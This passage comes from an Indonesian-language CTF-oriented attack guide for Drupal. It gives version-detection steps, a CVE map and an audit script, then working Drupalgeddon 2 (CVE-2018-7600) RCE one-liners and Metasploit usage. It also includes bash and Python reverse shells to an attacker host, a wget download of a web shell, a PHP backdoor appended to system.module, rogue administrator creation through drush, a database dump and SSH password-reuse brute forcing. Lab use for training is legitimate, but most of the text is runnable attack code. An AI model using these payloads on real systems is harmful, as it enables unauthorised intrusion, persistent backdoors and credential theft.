drush user-create attacker --mail="attacker@htb.local" --password="SuperPassword123!"
drush user-add-role "administrator" attacker

# 6. Dapatkan Link Login Otomatis Tanpa Perlu Tahu Password (One-Time Login Link)
drush user-login
# Output: http://default/user/reset/1/1689234123/AbCdEfGh... (Buka via browser untuk auto-login)
```

---

## 🛡️ Bagian 8: Post-Exploitation

### 8.1 Checklist Setelah Mendapat Shell Awal

```bash
# 1. Cari dan baca kredensial database
cat /var/www/html/sites/default/settings.php | grep -A 10 "databases"

# 2. Dump seluruh database Drupal menggunakan mysqldump lokal
mysqldump -u drupaluser -p'P@ssw0rdDrupalDB2023!' drupal_production > /tmp/drupal_dump.sql

# 3. Periksa izin direktori file upload publik
ls -la /var/www/html/sites/default/files/

# 4. Cari file sensitif tersembunyi atau SSH Keys milik pengguna sistem
find /var/www/ -name "*.bak" -o -name "*.old" -o -name "*.sql" 2>/dev/null
ls -la /home/
```

### 8.2 Lateral Movement via Password Reuse

Sering kali password database di `settings.php` digunakan ulang oleh user lokal server.

> **⚠️ Catatan Teknis:** Command `su` dengan heredoc (`<<<`) tidak reliable pada web shell (dumb shell) karena `su` membutuhkan interactive pseudo-terminal (TTY). Gunakan pengujian password reuse via loop SSH dengan `sshpass` berikut:

```bash
# Uji password database untuk login user lokal sistem via SSH (Reliable di web shell):
cat /etc/passwd | grep "/home" | cut -d: -f1 | \
  while read user; do
    echo "Testing SSH: $user"
    sshpass -p 'P@ssw0rdDrupalDB2023!' \
      ssh -o StrictHostKeyChecking=no \
      -o ConnectTimeout=3 \
      $user@localhost id 2>/dev/null \
      && echo "[+] SUCCESS: $user" || true
  done
```

### 8.3 Persistence di Drupal

- **Backdoor via Module:** Tambahkan fungsi web shell pada file modul yang aktif:

```bash
    echo '<?php if(isset($_POST["pwn"])){ system($_POST["pwn"]); die(); } ?>' >> /var/www/html/modules/system/system.module
    ```

---

## 🤖 Bagian 9: Automation Scripts

### 9.1 Script `drupal_full_audit.sh`

Simpan skrip ini di mesin Parrot OS Anda. Skrip ini melakukan validasi input yang ketat, mengidentifikasi versi melalui 5 metode, memeriksa file sensitif, mengecek Drupalgeddon 2 secara aman (_safe check_), dan mengenumerasi 5 UID pengguna awal.

```bash
#!/usr/bin/env bash
# ==============================================================================
# drupal_full_audit.sh - Komprehensif Drupal Auditor untuk Lingkungan CTF
# Dibuat khusus untuk Parrot Security OS
# ==============================================================================

set -eo pipefail

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
RESET="\e[0m"

# ----------------- INPUT VALIDATION -----------------
if [[ $# -ne 1 ]]; then
    echo -e "${RED}[-] Error: Parameter target URL tidak ditemukan.${RESET}"
    echo -e "Usage: $0 <TARGET_URL>"
    echo -e "Example: $0 http://10.10.11.200"
    exit 1
fi

TARGET="$1"

# Validasi format skema URL
if [[ ! "$TARGET" =~ ^https?:// ]]; then
    echo -e "${RED}[-] Error: URL harus diawali dengan http:// atau https://${RESET}"
    exit 1
fi

# Hapus trailing slash jika ada
TARGET="${TARGET%/}"

echo -e "${BLUE}[*] ====================================================${RESET}"
echo -e "${BLUE}[*]        DRUPAL COMPREHENSIVE PENTEST AUDITOR         ${RESET}"
echo -e "${BLUE}[*] Target: ${TARGET}${RESET}"
echo -e "${BLUE}[*] ====================================================${RESET}"

# ----------------- 1. DETEKSI VERSI MULTI-METHOD -----------------
echo -e "\n${YELLOW}[+] 1. Menjalankan Deteksi Versi Drupal...${RESET}"
DETECTED_VER=""

# Method A: /CHANGELOG.txt
VER_CHANGELOG=$(curl -s -k "${TARGET}/CHANGELOG.txt" | grep -m 1 -oP 'Drupal [0-9]+\.[0-9]+(\.[0-9]+)?' || true)
if [[ -n "$VER_CHANGELOG" ]]; then
    echo -e "    ${GREEN}[✓] Ditemukan via /CHANGELOG.txt: ${VER_CHANGELOG}${RESET}"
    DETECTED_VER="$VER_CHANGELOG"
fi

# Method B: /core/CHANGELOG.txt
VER_CORE_CHANGELOG=$(curl -s -k "${TARGET}/core/CHANGELOG.txt" | grep -m 1 -oP 'Drupal [0-9]+\.[0-9]+(\.[0-9]+)?' || true)
if [[ -n "$VER_CORE_CHANGELOG" ]]; then
    echo -e "    ${GREEN}[✓] Ditemukan via /core/CHANGELOG.txt: ${VER_CORE_CHANGELOG}${RESET}"
    DETECTED_VER="$VER_CORE_CHANGELOG"
fi

# Method C: /core/install.php
VER_INSTALL=$(curl -s -k "${TARGET}/core/install.php" | grep -oP 'Drupal [0-9]+\.[0-9]+(\.[0-9]+)?' | head -n 1 || true)
if [[ -n "$VER_INSTALL" ]]; then
    echo -e "    ${GREEN}[✓] Ditemukan via /core/install.php: ${VER_INSTALL}${RESET}"
    DETECTED_VER="${DETECTED_VER:-$VER_INSTALL}"
fi

# Method D: Meta Generator Tag
VER_META=$(curl -s -k "${TARGET}" | grep -oP 'content="Drupal [0-9]+' | cut -d'"' -f2 || true)
if [[ -n "$VER_META" ]]; then
    echo -e "    ${GREEN}[✓] Ditemukan via Meta Generator: ${VER_META}${RESET}"
    DETECTED_VER="${DETECTED_VER:-$VER_META}"
fi

if [[ -z "$DETECTED_VER" ]]; then
    echo -e "    ${RED}[-] Versi spesifik tidak terdeteksi dari file teks statis.${RESET}"
fi

# ----------------- 2. PEMERIKSAAN FILE SENSITIF -----------------
echo -e "\n${YELLOW}[+] 2. Memeriksa File Konfigurasi & Endpoint Sensitif...${RESET}"
CHECK_FILES=(
    "sites/default/settings.php"
    "sites/default/settings.php.bak"
    "sites/default/default.settings.php"
    "update.php"
    "install.php"
    "web.config"
    ".htaccess"
)

for file in "${CHECK_FILES[@]}"; do
    STATUS=$(curl -s -k -o /dev/null -w "%{http_code}" "${TARGET}/${file}")
    if [[ "$STATUS" == "200" ]]; then
        echo -e "    ${RED}[CRITICAL] ${file} TERBUKA! (Status: 200)${RESET}"
    elif [[ "$STATUS" == "403" ]]; then
        echo -e "    ${BLUE}[*] ${file} Dibatasi (Status: 403)${RESET}"
    fi
done

# ----------------- 3. SAFE DRUPALGEDDON 2 TEST -----------------
echo -e "\n${YELLOW}[+] 3. Memeriksa Kerentanan Drupalgeddon 2 (CVE-2018-7600)...${RESET}"

# Test aman menggunakan parameter 'printf 0x44525550' -> mencetak 'DRUP' jika rentan
DG2_TEST=$(curl -s -k -X POST "${TARGET}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  --data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=printf&mail[#type]=markup&mail[#markup]=DRUPAL_EXPLOIT_OK" || true)

if echo "$DG2_TEST" | grep -q "DRUPAL_EXPLOIT_OK"; then
    echo -e "    ${RED}[CRITICAL] TARGET RENTAN TERHADAP CVE-2018-7600 (Drupal 8 Register Form)!${RESET}"
else
    # Coba Drupal 7 form password
    DG2_D7_TEST=$(curl -s -k -X POST "${TARGET}/?q=user/password&name[%23post_render][]=printf&name[%23type]=markup&name[%23markup]=DRUPAL_EXPLOIT_OK" \
      --data "form_id=user_pass&_triggering_element_name=name" || true)
    if echo "$DG2_D7_TEST" | grep -q "DRUPAL_EXPLOIT_OK"; then
        echo -e "    ${RED}[CRITICAL] TARGET RENTAN TERHADAP CVE-2018-7600 (Drupal 7 Pass Form)!${RESET}"
    else
        echo -e "    ${GREEN}[✓] Target tidak merespon test payload Drupalgeddon 2.${RESET}"
    fi
fi

# ----------------- 4. USER ENUMERATION -----------------
echo -e "\n${YELLOW}[+] 4. Menjalankan Enumerasi User (UID 1-5)...${RESET}"
for uid in {1..5}; do
    LOC=$(curl -s -k -i "${TARGET}/user/${uid}" | grep -Ei "^Location:" | awk '{print $2}' | tr -d '\r' || true)
    if [[ -n "$LOC" ]]; then
        echo -e "    ${GREEN}[✓] UID ${uid} Redirect -> ${LOC}${RESET}"
    fi
done

echo -e "\n${BLUE}[*] Audit Selesai.${RESET}"
```

#### Cara Menjalankan:

```bash
chmod +x drupal_full_audit.sh
./drupal_full_audit.sh http://10.10.11.200
```

---

### 9.2 Script `drupal_version_cve.sh`

Skrip pembantu untuk memetakan nomor versi string ke CVE relevan dengan kalkulasi versi yang akurat:

```bash
#!/usr/bin/env bash
# ==============================================================================
# drupal_version_cve.sh - Mapping Versi Drupal ke Target CVE
# ==============================================================================

set -eo pipefail

if [[ $# -ne 1 ]]; then
    echo "Usage: $0 <DRUPAL_VERSION>"
    echo "Example: $0 7.54"
    exit 1
fi

VERSION="$1"

echo "[*] Menganalisis versi Drupal: $VERSION"

# Normalisasi versi menggunakan sort -V
version_lte() {
    [ "$1" = "$(echo -e "$1\n$2" | sort -V | head -n1)" ]
}

version_lt() {
    [ "$1" = "$2" ] && return 1 || version_lte "$1" "$2"
}

# Logika Verifikasi Kerentanan
if [[ "$VERSION" =~ ^7\. ]]; then
    echo -e "\e[34m[i] Platform: Drupal 7.x terdeteksi.\e[0m"
    
    if version_lt "$VERSION" "7.32"; then
        echo -e "\e[31m[!] CRITICAL: Rentan Drupalgeddon 1 (CVE-2014-3704) - SQL Injection!\e[0m"
        echo "    Exploit: Injeksi array SQL pada form login /?q=node"
    fi

    if version_lt "$VERSION" "7.58"; then
        echo -e "\e[31m[!] CRITICAL: Rentan Drupalgeddon 2 (CVE-2018-7600) - Pre-Auth RCE!\e[0m"
        echo "    Exploit: curl -X POST '.../?q=user/password' (Form API Passthru)"
    fi

    if version_lt "$VERSION" "7.59"; then
        echo -e "\e[33m[!] WARNING: Rentan Drupalgeddon 3 (CVE-2018-7602) - Post-Auth RCE!\e[0m"
    fi

elif [[ "$VERSION" =~ ^8\. ]]; then
    echo -e "\e[34m[i] Platform: Drupal 8.x terdeteksi.\e[0m"

    if version_lt "$VERSION" "8.5.1"; then
        echo -e "\e[31m[!] CRITICAL: Rentan Drupalgeddon 2 (CVE-2018-7600) - Pre-Auth RCE!\e[0m"
        echo "    Exploit: curl -X POST '/user/register' (Form API Ajax)"
    fi

    if version_lt "$VERSION" "8.6.10"; then
        echo -e "\e[31m[!] CRITICAL: Rentan REST Deserialization RCE (CVE-2019-6340)!\e[0m"
        echo "    Exploit: Kirim serialized payload ke /node?_format=hal_json"
    fi
else
    echo "[-] Versi di luar jangkauan analisa otomatis (9.x / 10.x atau tidak valid)."
fi
```

#### Cara Menjalankan:

```bash
chmod +x drupal_version_cve.sh
./drupal_version_cve.sh 7.54
```

---

### 9.3 One-Liner Quick Checks

Perintah cepat copy-paste saat berkompetisi di CTF:

```bash
# 1. Deteksi Cepat Seluruh Method Versi Drupal
curl -s http://10.10.11.200/CHANGELOG.txt | head -n 2; curl -s http://10.10.11.200/core/CHANGELOG.txt | head -n 2

# 2. Pengujian Instan Drupalgeddon 2 (Drupal 7)
curl -s -k -X POST "http://10.10.11.200/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id" --data "form_id=user_pass" | grep -o 'uid=[0-9]*(.*)'

# 3. Pengujian Instan Drupalgeddon 2 (Drupal 8)
curl -s -k -X POST "http://10.10.11.200/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" --data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id" | grep -o 'uid=[0-9]*(.*)'

# 4. User Enumeration Loop 1-5
for i in {1..5}; do echo -n "UID $i: "; curl -s -I "http://10.10.11.200/user/$i" | grep -i "Location:"; done

# 5. Cek Keterbukaan File Sensitif settings.php
curl -s -o /dev/null -w "%{http_code}\n" http://10.10.11.200/sites/default/settings.php
```

---

## ⚠️ Bagian 10: Common Errors & Troubleshooting

|No|Error / Problem|Penyebab|Solusi Pentest|
|---|---|---|---|
|**1**|`droopescan: command not found`|Belum terpasang atau path `~/.local/bin` belum ada di environment variable|Jalankan `sudo pip3 install droopescan --break-system-packages` dan pastikan binary link ada di `/usr/local/bin/`.|
|**2**|`CHANGELOG.txt` return 404 Not Found|Dihapus oleh administrator sistem atau target menggunakan Drupal versi modern (Drupal 8.5+ memindahkan atau menghapus file ini)|Periksa alternatif: `/core/CHANGELOG.txt`, `/core/install.php`, atau ekstrak versi pasif melalui string query aset JS di DOM.|
|**3**|PoC CVE-2018-7600 tidak menghasilkan response apapun|Form registrasi dinonaktifkan (`user_register_form` return 403), atau target sudah dipatch|Beralih dari form registrasi ke form reset password: targetkan endpoint `/?q=user/password` dengan parameter `user_pass`.|
|**4**|Menu 'PHP Filter' tidak ada pada Drupal 7|Modul bawaan belum diaktifkan atau file modul dihapus secara manual|Unggah modul kustom via `/admin/modules/install` atau gunakan teknik template injection pada `template.php`.|
|**5**|Gagal mengunggah modul (Format file ditolak)|Drupal menolak file `.zip` karena library ekstensi zip php server tidak aktif|Kompresi modul ke dalam format `.tar.gz` menggunakan `tar -czvf module.tar.gz files...`.|
|**6**|Reverse shell mati seketika setelah terkoneksi|Target mengaktifkan PHP `disable_functions` untuk fungsi `exec`/`passthru`/`shell_exec`|Gunakan reverse shell alternatif berbasis Python, Perl, atau web shell bertahap menggunakan `file_put_contents`.|
|**7**|Hashcat error: `Hash-Mode 7900 not found`|Versi Hashcat terlalu usang pada instalasi OS lama|Update paket: `sudo apt update && sudo apt install --only-upgrade hashcat` atau gunakan John the Ripper (`--format=drupal7`).|
|**8**|Endpoint `/update.php` terkunci|Akses dibatasi secara native oleh konfigurasi `$update_free_access = FALSE`|Ubah variabel tersebut menjadi `TRUE` jika Anda sudah memegang LFI/Web Shell untuk melakukan bypass login update.|
|**9**|Direktori `/sites/default/files/` mengembalikan status 403 saat file PHP dipanggil|Terdapat file `.htaccess` di dalam folder upload yang mematikan PHP execution (`SetHandler Drupal_Security_Do_Not_Remove_See_Core_Readme`)|Buat subdirektori baru, atau manfaatkan modifikasi tema template daripada menulis ke folder upload publik.|
|**10**|Perintah `drush` tidak ditemukan saat berhasil spawn web shell|Binary Drush terpasang di lokasi non-standar (misal: `/root/.composer/vendor/bin/drush` atau folder local composer vendor)|Cari secara manual: `find / -name drush -type f 2>/dev/null` atau panggil binary lokal di `/var/www/html/vendor/bin/drush`.|

---

## ⚡ Bagian 11: Cheatsheet Drupal

### 🎯 Variables Setup

```bash
export TARGET="http://10.10.11.200"
export ATTACKER_IP="10.10.14.5"
export ATTACKER_PORT="4444"
```

---

### 🔎 DETECTION (Semua Method)

```bash
# Method 1: Changelog
curl -s "$TARGET/CHANGELOG.txt" | head -n 3
# Method 2: Core Changelog
curl -s "$TARGET/core/CHANGELOG.txt" | head -n 3
# Method 3: Core Install
curl -s "$TARGET/core/install.php" | grep -i "Drupal"
# Method 4: Meta Generator
curl -s "$TARGET" | grep -i 'name="generator"'
# Method 5: JSON:API
curl -s "$TARGET/jsonapi" | jq .
```

---

### 👥 ENUMERATION

```bash
# Droopescan
droopescan scan drupal -u "$TARGET"

# User Enumeration (UID 1-5)
for i in {1..5}; do curl -s -I "$TARGET/user/$i" | grep -Ei "location:" | awk '{print $2}'; done
```

---

### 💥 EXPLOITATION

#### 1. CVE-2018-7600 (Drupalgeddon 2) One-Liner RCE

```bash
# Target: Drupal 7.x
curl -s -k -X POST "$TARGET/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id" --data "form_id=user_pass"

# Target: Drupal 8.x
curl -s -k -X POST "$TARGET/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" --data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"
```

#### 2. Hash Cracking (SS)

```bash
# Hashcat
hashcat -m 7900 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --format=drupal7 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

#### 3. Admin Access ke Reverse Shell (PHP Filter)

1. Buka `$TARGET/?q=admin/modules` → Aktifkan **PHP filter**.
2. Tambahkan konten: `$TARGET/?q=node/add/page`.
3. Set Text Format ke **PHP code**, masukkan: `<?php system($_GET['c']); ?>`.
4. Trigger: `$TARGET/?q=node/1&c=id`.

---

### 💀 POST-EXPLOITATION (Drush Actions)

```bash
# Reset Admin Password Langsung
drush user-password admin --password="PwnedPassword123!"

# Query DB
drush sql-query "SELECT uid, name, pass FROM users WHERE uid = 1;"

# Aktifkan Modul PHP
drush pm-enable php -y
```

---

### 📊 TABEL RUJUKAN CVE LENGKAP (BAGIAN 3)

|CVE Identifier|Target Komponen|Batas Versi Rentan|Command Eksekusi Utama|
|---|---|---|---|
|**CVE-2018-7600**|Core Form API|7.x < 7.58, 8.x < 8.5.1|`curl -s -k -X POST "$TARGET/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id" --data "form_id=user_pass"`|
|**CVE-2018-7602**|Core Form API|7.x < 7.59, 8.x < 8.5.2|`python3 drupalgeddon3.py -u $TARGET -c 'id' -user admin -pass password`|
|**CVE-2014-3704**|Database API|7.0 s.d. 7.31|Injeksi array SQL `name[0;...]=test` pada endpoint login blok|
|**CVE-2019-6340**|REST Services|8.x < 8.6.10|`curl -X POST "$TARGET/node?_format=hal_json" -H "Content-Type: application/hal+json" -d @payload.json`|
|**CVE-2019-6339**|Phar Stream|< 7.62, < 8.6.6|Trigger deserialisasi file `.phar` via wrapper URL image style|
|**CVE-2020-13625**|Core Mail System|< 7.74, < 8.8.10|Injeksi baris parameter email tambahan pada header form contact|
|**CVE-2020-28949**|PEAR Archive_Tar|< 7.75, < 8.9.10|Unggah file `.tar` jahat yang memuat path traversal ke installer modul|
|**CVE-2017-6920**|YAML Parser|8.0.x s.d. 8.3.3|Injeksi arbitrary class load pada file import YAML konfigurasi|

---

# 17c — Drupal Complete Attack Workflow — Interactive Decision Guide

> **Cara baca:** Setiap langkah punya ✅ OUTPUT BERHASIL dan ❌ OUTPUT GAGAL. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"
export LPORT="4444"
mkdir -p ~/drupal_loot/{enum,creds,files,shell}
cd ~/drupal_loot

echo "[*] Target: $TARGET | LHOST: $LHOST | LPORT: $LPORT"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | LHOST: 10.10.14.5 | LPORT: 4444
```

---

## ═══════════════════════════════════════

## FASE 0: KONFIRMASI DRUPAL & DETEKSI VERSI

## ═══════════════════════════════════════

### Langkah 0.1 — Konfirmasi CMS adalah Drupal

Bash

```
# Command 1: Meta generator tag (paling cepat)
curl -s "http://$TARGET" | grep -i 'generator'

# Command 2: Cek path khas Drupal
curl -s -o /dev/null -w "%{http_code}" "http://$TARGET/user/login"
curl -s -o /dev/null -w "%{http_code}" "http://$TARGET/?q=user/login"

# Command 3: Cek robots.txt
curl -s "http://$TARGET/robots.txt" | grep -iE "drupal|sites/default|node"
```

**OUTPUT BERHASIL ✅ — Generator tag terdeteksi:**

HTML

```
<meta name="generator" content="Drupal 7 (http://drupal.org)" />
```

➡️ Confirmed Drupal 7. Lanjut ke **Langkah 0.2**

HTML

```
<meta name="generator" content="Drupal 8 (https://www.drupal.org)" />
```

➡️ Confirmed Drupal 8+. Lanjut ke **Langkah 0.2**

**OUTPUT GAGAL ❌ — Generator disembunyikan:**

text

```
(tidak ada output / meta generator berbeda)
```

➡️ Cek cara lain:

Bash

```
# Cek struktur direktori khas Drupal
curl -s -o /dev/null -w "%{http_code}\n" "http://$TARGET/sites/default/settings.php"
curl -s -o /dev/null -w "%{http_code}\n" "http://$TARGET/sites/all/modules/"
curl -s -o /dev/null -w "%{http_code}\n" "http://$TARGET/core/lib/"

# Cek header X-Generator
curl -s -I "http://$TARGET" | grep -i "x-generator\|x-powered\|drupal"
```

**OUTPUT — Header leak:**

text

```
X-Generator: Drupal 7 (https://www.drupal.org)
```

➡️ Confirmed Drupal via header. Lanjut ke **Langkah 0.2**

---

### Langkah 0.2 — Deteksi Versi (7 Method Paralel — Jalankan Semua)

Bash

```
# Method A: CHANGELOG.txt (PALING RELIABLE untuk Drupal 6 & 7)
curl -s "http://$TARGET/CHANGELOG.txt" | head -n 3

# Method B: core/CHANGELOG.txt (Drupal 8+)
curl -s "http://$TARGET/core/CHANGELOG.txt" | head -n 3

# Method C: README.txt
curl -s "http://$TARGET/README.txt" | grep -i "Drupal [0-9]"

# Method D: install.php
curl -s "http://$TARGET/core/install.php" | grep -i "Drupal"
curl -s "http://$TARGET/install.php" | grep -i "Drupal"

# Method E: update.php header leak
curl -s -I "http://$TARGET/update.php" | grep -Ei "x-generator|drupal"

# Method F: Meta generator dari root
curl -s "http://$TARGET" | grep -oP 'content="Drupal [0-9]+[^"]*"'

# Method G: JSON:API (Drupal 8+)
curl -s "http://$TARGET/jsonapi" | jq '.meta' 2>/dev/null || \
curl -s "http://$TARGET/jsonapi" | grep -i "drupal"

# Method H: Droopescan (otomatis semua)
droopescan scan drupal -u "http://$TARGET" -t 16 \
    | tee ~/drupal_loot/enum/droopescan.txt
```

**OUTPUT BERHASIL ✅ — CHANGELOG.txt:**

text

```
Drupal 7.54, 2017-02-01
-----------------------
- Fixed security issues...
```

text

```
Drupal 8.5.0, 2018-03-07
------------------------
- Added support for PHP 7.2.
```

**OUTPUT BERHASIL ✅ — Droopescan:**

text

```
[+] Possible version(s):
    7.54
    7.55
    7.56
[+] Plugins found:
    views http://10.10.11.200/sites/all/modules/views/
    ctools http://10.10.11.200/sites/all/modules/ctools/
```

➡️ **PENTING — Decision berdasarkan versi:**

|Versi Terdeteksi|Exploit Prioritas|
|---|---|
|`7.x < 7.32`|**→ FASE 1A (Drupalgeddon 1 SQLi) + FASE 1B (Drupalgeddon 2)**|
|`7.32 ≤ ver < 7.58`|**→ LANGSUNG FASE 1B (Drupalgeddon 2 via password form)**|
|`7.58 ≤ ver < 7.59`|**→ FASE 1C (Drupalgeddon 3, butuh auth)**|
|`8.x < 8.5.1`|**→ LANGSUNG FASE 1B (Drupalgeddon 2 via register form)**|
|`8.x < 8.6.10`|**→ FASE 1D (REST RCE CVE-2019-6340)**|
|Versi tidak terdeteksi|**→ ke FASE 2 (Enumeration manual)**|

➡️ Jalankan version-CVE mapper:

Bash

```
# Quick CVE check berdasarkan versi
./drupal_version_cve.sh 7.54
# atau manual:
echo "Versi 7.54 < 7.58 → VULNERABLE ke Drupalgeddon 2 (CVE-2018-7600)"
```

**OUTPUT GAGAL ❌ — Semua file 404:**

text

```
404 Not Found
```

➡️ File version disclosure sudah dihapus admin. Tetap lanjut ke FASE 1B — coba exploit dulu, versi mungkin tetap vulnerable.

---

## ═══════════════════════════════════════

## FASE 1B: CVE-2018-7600 — DRUPALGEDDON 2

## (Drupal 7.x < 7.58 atau 8.x < 8.5.1) — PRE-AUTH RCE

## ═══════════════════════════════════════

> **Tujuan:** RCE tanpa autentikasi via Form API injection

### Langkah 1B.1 — Safe Non-Destructive Test (Konfirmasi Dulu!)

Bash

```
# Test AMAN untuk Drupal 7 (via password reset form)
curl -s -k -X POST \
    "http://$TARGET/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id" \
    --data "form_id=user_pass&_triggering_element_name=name" \
    | grep -o 'uid=[0-9]*(.*) gid=[0-9]*(.*)'

# Test AMAN untuk Drupal 8 (via user register form)
curl -s -k -X POST \
    "http://$TARGET/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
    --data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=printf&mail[#type]=markup&mail[#markup]=DRUPAL_VULN_OK" \
    | grep "DRUPAL_VULN_OK"
```

**OUTPUT BERHASIL ✅ — Drupal 7 vulnerable:**

text

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

➡️ **CONFIRMED VULNERABLE!** Lanjut ke **Langkah 1B.2**

**OUTPUT BERHASIL ✅ — Drupal 8 vulnerable:**

text

```
[{"command":"insert","method":"replaceWith","selector":null,"data":"DRUPAL_VULN_OK"}]
```

➡️ **CONFIRMED VULNERABLE!** Lanjut ke **Langkah 1B.2**

**OUTPUT GAGAL ❌ — HTML biasa tanpa uid string:**

HTML

```
<!DOCTYPE html>
<html>...normal page...
```

➡️ Tidak vulnerable atau form dinonaktifkan. Coba endpoint alternatif:

Bash

```
# Drupal 7 - Coba endpoint lain
curl -s -k -X POST \
    "http://$TARGET/?q=user/register&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id" \
    --data "form_id=user_register_form" \
    | grep -o 'uid=[0-9]*(.*)'

# Jika masih gagal → ke FASE 1A (jika versi < 7.32) atau FASE 2
```

---

### Langkah 1B.2 — Exploit via Berbagai Method

Bash

```
# === METHOD A: Metasploit (PALING RELIABLE) ===
msfconsole -q -x "
use exploit/unix/webapp/drupal_drupalgeddon2;
set RHOSTS $TARGET;
set TARGETURI /;
set LHOST $LHOST;
set LPORT $LPORT;
set PAYLOAD php/meterpreter/reverse_tcp;
check;
exploit
"
```

**OUTPUT BERHASIL ✅ — check:**

text

```
[+] 10.10.11.200:80 - The target appears to be vulnerable.
```

text

```
[*] Meterpreter session 1 opened
meterpreter > shell
$ whoami
www-data
```

➡️ Shell didapat! Ke **FASE 6 (Post-Exploitation)**

Bash

```
# === METHOD B: Ruby PoC dari Exploit-DB (JIKA MSF gagal) ===
# PENTING: File 44449 adalah Ruby, BUKAN Python!
searchsploit -m 44449
mv 44449.rb drupalgeddon2.rb
ruby drupalgeddon2.rb "http://$TARGET"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] --==[::#Gr0nk Shock!::]==--
[*] Target : http://10.10.11.200
[*] Exploit: Successful!
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

Bash

```
# === METHOD C: Python PoC (Alternatif Ruby) ===
curl -s -o drupalgeddon2.py \
    https://raw.githubusercontent.com/pimps/CVE-2018-7600/master/drupa17.py
python3 drupalgeddon2.py -c "id" "http://$TARGET"
```

**OUTPUT BERHASIL ✅:**

text

```
[+] Check: Vulnerable!
[+] Output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Bash

```
# === METHOD D: Raw curl (Drupal 7 - paling manual, paling paham) ===
# Penjelasan payload:
# name[#post_render][] = passthru  → panggil fungsi passthru()
# name[#type] = markup             → tipe elemen HTML
# name[#markup] = id               → command yang dijalankan

curl -s -k -X POST \
    "http://$TARGET/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id" \
    --data "form_id=user_pass&_triggering_element_name=name"

# Drupal 8 raw curl:
curl -s -k -X POST \
    "http://$TARGET/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
    --data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"
```

---

### Langkah 1B.3 — Upgrade ke Reverse Shell

Bash

```
# Step 1: Setup listener
nc -lvnp $LPORT &

# Step 2: Encode payload untuk menghindari karakter khusus
PAYLOAD=$(echo -n "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" | base64 -w0)
echo "[*] Encoded payload: $PAYLOAD"

# Step 3a: Via Drupal 7 curl
curl -s -k -X POST \
    "http://$TARGET/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo+${PAYLOAD}|base64+-d|bash" \
    --data "form_id=user_pass&_triggering_element_name=name"

# Step 3b: Via Python PoC
python3 drupalgeddon2.py -c "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'" "http://$TARGET"

# Step 3c: Via Metasploit shell session
# Sudah otomatis di method A
```

**OUTPUT BERHASIL ✅ — Listener mendapat koneksi:**

text

```
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.200] 49812
www-data@target:/var/www/html$
```

➡️ Stabilisasi shell:

Bash

```
# Di dalam netcat shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Tekan Ctrl+Z
stty raw -echo; fg
# Tekan Enter 2x
export TERM=xterm-256color
stty rows 40 cols 170
```

**OUTPUT GAGAL ❌ — Exploit completed tapi no session:**

text

```
[*] Exploit completed, but no session was created.
```

➡️ Cek firewall atau coba payload berbeda:

Bash

```
# Coba payload python reverse shell sebagai alternatif bash
python3 drupalgeddon2.py \
    -c "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" \
    "http://$TARGET"

# Atau coba dengan PAYLOAD wget-based
# Upload shell lewat wget dulu
python3 drupalgeddon2.py \
    -c "wget http://$LHOST:8000/shell.php -O /var/www/html/sites/default/files/shell.php" \
    "http://$TARGET"
# Lalu akses: curl "http://$TARGET/sites/default/files/shell.php?cmd=id"
```

**OUTPUT GAGAL ❌ — disable_functions aktif:**

text

```
(output kosong, exec/passthru/system tidak bekerja)
```

➡️ PHP disable_functions diaktifkan. Coba fungsi alternatif:

Bash

```
# Coba dengan proc_open, popen, atau file_put_contents
python3 drupalgeddon2.py \
    -c "file_put_contents('/var/www/html/sites/default/files/x.php','<?php system(\$_GET[\"c\"]);?>')" \
    "http://$TARGET"

# Test akses
curl "http://$TARGET/sites/default/files/x.php?c=id"
```

---

## ═══════════════════════════════════════

## FASE 1A: CVE-2014-3704 — DRUPALGEDDON 1

## (Drupal 7.x < 7.32) — PRE-AUTH SQLi

## ═══════════════════════════════════════

> **Gunakan jika versi < 7.32**

### Langkah 1A.1 — SQL Injection via Login Form

Bash

```
# Hash valid Drupal 7 untuk password "admin123"
# PENTING: Hash ini HARUS dihasilkan oleh Drupal runtime!
# Generate hash valid:
php -r "
define('DRUPAL_ROOT', '/var/www/html');
require_once DRUPAL_ROOT . '/includes/password.inc';
